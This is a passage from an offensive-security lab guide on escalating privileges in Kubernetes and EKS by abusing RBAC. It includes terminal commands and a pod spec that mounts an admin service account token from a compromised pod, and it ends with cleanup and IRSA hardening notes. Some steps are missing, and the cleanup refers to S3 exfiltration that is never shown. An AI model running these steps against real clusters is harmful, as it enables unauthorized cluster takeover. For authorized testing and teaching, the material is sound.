Objective: Enumerate Kubernetes RBAC policies to map cluster roles, role bindings, and identify privilege escalation paths from a compromised pod.
Prerequisites
  • Shell access to a running Kubernetes pod with a mounted service account token
  • kubectl available inside the pod, or curl + jq to query the API directly
  • Basic understanding of Kubernetes RBAC: ClusterRole, RoleBinding, ServiceAccount
  • For EKS-specific escalation: AWS CLI configured with credentials of a compromised IAM principal
Authorized testing only. These enumeration and escalation techniques require a test EKS cluster where you have explicit written permission to perform offensive security work.

The most dangerous K8s RBAC permissions for privilege escalation: create pods, create pods/exec, get secrets, create/update rolebindings, impersonate, and escalate. In EKS, also treat update on aws-auth as equivalent to cluster-admin grant.
Objective: Escalate from a low-privilege service account with pod creation rights to cluster-admin by creating a pod that mounts a high-privilege service account token. Also cover the correct node shell technique using kubectl debug.
Prerequisites
  • Service account with create pods permission in at least one namespace
  • At least one high-privilege service account (e.g., admin-sa) present in the same namespace
  • kubectl configured with the low-privilege service account token
1
Verify the current service account can create pods. This single permission is sufficient for full cluster compromise if any admin-level service accounts exist.
Terminal
root@compromised-pod:/# kubectl auth can-i create pods
yes
root@compromised-pod:/# # Find high-privilege service accounts kubectl get sa -o json | jq '.items[] | select(.metadata.name | test("admin|deploy|cluster")) | .metadata.name'
"admin-sa" "platform-deployer-sa"
2
Create a pod YAML spec that uses the admin service account. The automountServiceAccountToken: true ensures the admin token is projected into the pod.
Terminal
root@compromised-pod:/# cat > /tmp/escalation-pod.yaml <<'EOF' apiVersion: v1 kind: Pod metadata: name: escalation-pod namespace: default labels: app: debug-tools spec: serviceAccountName: admin-sa automountServiceAccountToken: true containers: - name: escalate image: ubuntu:22.04 command: ["/bin/bash", "-c", "apt-get update -qq && apt-get install -y -qq curl jq && sleep infinity"] securityContext: runAsUser: 0 restartPolicy: Never EOF
3
Create the escalation pod. Kubernetes schedules it with the admin service account's token automatically mounted.
Terminal

root@compromised-pod:/# kubectl get pod escalation-pod -w

4
Exec into the escalation pod and read the admin service account token. Decode the JWT payload to confirm the service account identity.

Cleanup
  • Revoke any STS sessions created during the lab (note: STS sessions cannot be explicitly revoked; wait for expiration or update the IAM role's trust policy to block the session)
  • Delete any files exfiltrated from S3 during the lab
  • Audit all IRSA role trust policies to confirm Condition blocks are present and correctly scoped
IRSA is the bridge between Kubernetes and AWS IAM. Audit all IRSA role trust policies to ensure Condition blocks restrict to specific service accounts and namespaces. A missing condition allows any K8s SA to assume the role. Also consider using EKS Pod Identity (newer mechanism) which has tighter binding semantics.
